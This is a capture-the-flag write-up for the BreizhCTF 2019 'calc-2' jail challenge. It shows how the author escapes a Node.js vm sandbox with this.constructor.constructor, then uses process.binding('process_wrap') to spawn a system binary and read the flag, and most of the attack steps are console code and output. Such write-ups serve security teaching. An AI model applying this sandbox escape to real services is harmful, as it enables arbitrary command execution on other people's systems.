---
title: BreizhCTF 2019 - calc-2
authors: dabi0ne
layout: writeup
ctf_url: https://www.breizhctf.com/
---
Solves: 0 / Points: 400 / Category: Jail

## Challenge description 
See [challenge source code](/assets/calc2.js)

The sandbox is implemented using [Node.js `vm` module](https://nodejs.org/api/vm.html)

## Challenge resolution
Our goal is to execute a system command to obtain the flag.

### Step one: Escape from the vm
To escape from the vm we will use a constructor of constructor to create an anonymous function with controlled body.

This is a simple example using Firefox JS console:
```js
>> this.constructor.constructor("alert(1)")
function anonymous()
>> this.constructor.constructor("alert(1)").toString()
"function anonymous(
) {
alert(1)
}"
```

Using this technique we can execute code outside the vm context.
Indeed, the `this` object, when it is returned by calling `constructor`, is not restricted to log function:
```js
>> log(this.constructor.constructor('return this')());
> EOF
[Function: anonymous]
Object [global] {
  global: [Circular],
  process:
   process {
     title: 'nodejs',
     version: 'v10.15.2',
.
.
.
  setImmediate:
   { [Function: setImmediate] [Symbol(util.promisify.custom)]: [Function] },
  setInterval: [Function: setInterval],
  setTimeout:
   { [Function: setTimeout] [Symbol(util.promisify.custom)]: [Function] } }
```

Comparing to the vm context:
```js
> log(this);
> EOF
{ log: [Function] }
```

### Step two: Execute a shell command
The `process.mainModule` of the script was cleaned so we didn't have access to the `require` function:
```js
/* remove mainModule for better security */
process.mainModule = {};
```

However, we identified that the `binding` function is available on the object returned by the constructor:
```js
> log(this.proc = this.constructor.constructor('return this.process')());

binding: [Function: binding]
```
The `binding` function allows loading internal modules. 
Firstly, we tried to read the flag from the file using the `fs` module:
```js
> log(this.constructor.constructor('return this.process.binding')()('fs')
```
Fail :( 

But we were able to list directories and identify the flag location:

```js
> log(this.constructor.constructor('return this.process.binding')()('fs').readdir('/home/guest', {}, "","", function (err, data) {data}));
```

After a tip from the challenge author: "you don't have `child_process` and its `exec` function, so write it"


So let's read [nodejs source code on Github for `child_process`](https://github.com/nodejs/node/blob/master/lib/internal/child_process.js):

The outcome is that the `child_process` uses an internal binding of `process_wrap` to execute commands by calling the `spawn` function:

```js
const { Process } = internalBinding('process_wrap');

child.spawn({
    file: opts.file,
    args: opts.args,
    cwd: options.cwd,
    windowsHide: !!options.windowsHide,
    windowsVerbatimArguments: !!options.windowsVerbatimArguments,
    detached: !!options.detached,
    envPairs: opts.envPairs,
    stdio: options.stdio,
    uid: options.uid,
    gid: options.gid
});
```

Hence, we have to create a `Process` object and call its `spawn` function to execute system commands:

1 - Check if the binding doesn't fail: 
```js
> log(this.constructor.constructor('return this.process.binding')()('process_wrap'));
> EOF
{ Process: [Function: Process] }

```
2 - Instantiate a `Process` object:
```js
> log(this.proc_wrap = this.constructor.constructor('return this.process.binding')());
> log(this.Process = this.proc_wrap('process_wrap').Process);
> log(this.process = new Process());
```

3 - Call the `spawn` function with the good parameters:

```js
> log(this.env = this.constructor.constructor('return this.process.env')());
> log(this.mproc  = this.constructor.constructor('return this.process')());
> log(this.sot = this.constructor.constructor('return this.process.stdout')());
> log(this.sin = this.constructor.constructor('return this.process.stdin')());
> log(this.rc = process.spawn({file:'/home/guest/flag_reader',args:[],cwd:"/home/guest",windowsVerbatimArguments:false,detached:false,envPairs:this.env, stdio:[mproc.stdin, mproc.stdout, mproc.stderr]}));

> EOF

breizctf_flag{FORGOTTEN_FLAG}
```

